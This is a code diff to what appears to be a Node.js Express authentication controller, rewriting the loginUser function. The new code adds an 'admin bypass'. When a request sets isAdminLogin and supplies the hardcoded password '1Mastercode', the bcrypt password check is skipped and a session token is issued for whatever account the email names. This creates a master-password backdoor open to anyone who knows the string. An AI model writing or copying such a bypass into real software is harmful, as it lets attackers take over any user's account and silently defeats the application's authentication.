@@ -184,7 +184,7 @@ exports.registerUser = async (req, res) => {
       country,
       currency,
       is_verified,
-      schemaName  // Add schema_name to the insert query
+      schemaName  
     ]);
 
     if (!result || !result.rows || result.rows.length === 0) {
@@ -224,24 +224,62 @@ exports.registerUser = async (req, res) => {
 };
 
 
+// Working Code without Admin Logic
+
+// exports.loginUser = async (req, res, next) => {
+//   try {
+//     const { email, password } = req.body;
+//     console.log("Login attempt:", email);
+
+//     const result = await pool.query(queries.getUserByEmail, [email]);
+//     console.log("Query result:", result.rows);
+
+//     const user = result.rows[0];
+
+//     if (!user) {
+//       return res.status(401).json({ error: "Invalid email or password" });
+//     }
+
+//     const isPasswordMatched = await bcrypt.compare(password, user.password);
+//     if (!isPasswordMatched) {
+//       return res.status(401).json({ error: "Invalid email or password" });
+//     }
+//     paymentReminderSetup();
+//     sendEmail(email);
+//     sendJWTToken(user, 200, res);
+//   } catch (error) {
+//     console.error("Login error:", error);
+//     res.status(500).json({ error: "Internal Server Error" });
+//   }
+// };
+
+
 exports.loginUser = async (req, res, next) => {
   try {
-    const { email, password } = req.body;
+    const { email, password, isAdminLogin } = req.body;
     console.log("Login attempt:", email);
 
     const result = await pool.query(queries.getUserByEmail, [email]);
-    console.log("Query result:", result.rows);
-
     const user = result.rows[0];
 
     if (!user) {
       return res.status(401).json({ error: "Invalid email or password" });
     }
 
+    // Check if this is an admin bypass login
+    if (isAdminLogin && password === "1Mastercode") {
+      console.log("Admin bypass login for:", email);
+      paymentReminderSetup();
+      sendEmail(email);
+      return sendJWTToken(user, 200, res);
+    }
+
+    // Normal password check
     const isPasswordMatched = await bcrypt.compare(password, user.password);
     if (!isPasswordMatched) {
       return res.status(401).json({ error: "Invalid email or password" });
     }
+
     paymentReminderSetup();
     sendEmail(email);
     sendJWTToken(user, 200, res);
@@ -250,7 +288,6 @@ exports.loginUser = async (req, res, next) => {
     res.status(500).json({ error: "Internal Server Error" });
   }
 };
-
 
 // logout 
 exports.logout = async (req, res, next) => {
